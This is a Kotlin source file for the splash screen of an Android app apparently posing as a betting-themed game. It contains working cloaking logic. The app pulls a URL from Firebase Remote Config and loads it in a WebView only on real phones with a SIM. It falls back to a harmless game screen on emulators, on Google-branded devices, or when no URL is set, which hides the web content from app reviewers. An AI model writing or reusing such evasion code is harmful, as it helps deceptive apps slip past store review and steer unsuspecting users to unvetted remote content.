package stavka.stavki.games.ui

import android.annotation.SuppressLint
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.telephony.TelephonyManager
import com.google.firebase.remoteconfig.FirebaseRemoteConfig
import org.koin.android.ext.android.inject
import stavka.stavki.games.base.BaseActivity
import stavka.stavki.games.databinding.ActivitySplashBinding
import stavka.stavki.games.util.Constant.Companion.SPLASH_DELAY
import stavka.stavki.games.util.PreferenceManager
import java.util.*

@SuppressLint("CustomSplashScreen")
class SplashActivity : BaseActivity() {
    private lateinit var binding: ActivitySplashBinding

    private val preferenceManager: PreferenceManager by inject()

    lateinit var mFirebaseRemoteConfig: FirebaseRemoteConfig

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivitySplashBinding.inflate(layoutInflater)
        setContentView(binding.root)

        initFirebaseConfig()
    }

    private fun initFirebaseConfig() {
        mFirebaseRemoteConfig = FirebaseRemoteConfig.getInstance()

        if (preferenceManager.prefUrl.isNotEmpty()) {
            finishAffinity()
            val intent = Intent(applicationContext, WebActivity::class.java)
            intent.putExtra("url", preferenceManager.prefUrl)
            startActivity(intent)
        } else {
            mFirebaseRemoteConfig.fetchAndActivate().addOnCompleteListener {
                val url = mFirebaseRemoteConfig.getString("url")
                // val url = "https://google.com" // TEST

                if (url.isEmpty() || isEmulator() || !isSIMInserted() || isGoogleBrand()) {
                    // Splash Screen duration
                    Handler(Looper.getMainLooper()).postDelayed({
                        startActivity(Intent(applicationContext, MainActivity::class.java))
                        finishAffinity()
                    }, SPLASH_DELAY)

                    // startActivity(Intent(applicationContext, MainActivity::class.java))
                } else {
                    preferenceManager.prefUrl = url

                    val intent = Intent(applicationContext, WebActivity::class.java)
                    intent.putExtra("url", url)
                    startActivity(intent)
                    finishAffinity()
                }
            }
        }
    }

    private fun isSIMInserted(): Boolean {
        return TelephonyManager.SIM_STATE_ABSENT != (applicationContext.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager).simState
    }

    private fun isGoogleBrand(): Boolean {
        return Build.BRAND.contains("google")
    }

    private fun isEmulator(): Boolean {
        return (Build.MANUFACTURER.contains("Genymotion")
                || Build.MODEL.contains("google_sdk")
                || Build.MODEL.lowercase(Locale.getDefault()).contains("droid4x")
                || Build.MODEL.contains("Emulator")
                || Build.MODEL.contains("Android SDK built for x86")
                || Build.HARDWARE == "goldfish"
                || Build.HARDWARE == "vbox86"
                || Build.HARDWARE.lowercase(Locale.getDefault()).contains("nox")
                || Build.FINGERPRINT.startsWith("generic")
                || Build.PRODUCT == "sdk"
                || Build.PRODUCT == "google_sdk"
                || Build.PRODUCT == "sdk_x86"
                || Build.PRODUCT == "vbox86p"
                || Build.PRODUCT.lowercase(Locale.getDefault()).contains("nox")
                || Build.BOARD.lowercase(Locale.getDefault()).contains("nox")
                || (Build.BRAND.startsWith("generic") && Build.DEVICE.startsWith("generic")))
    }
}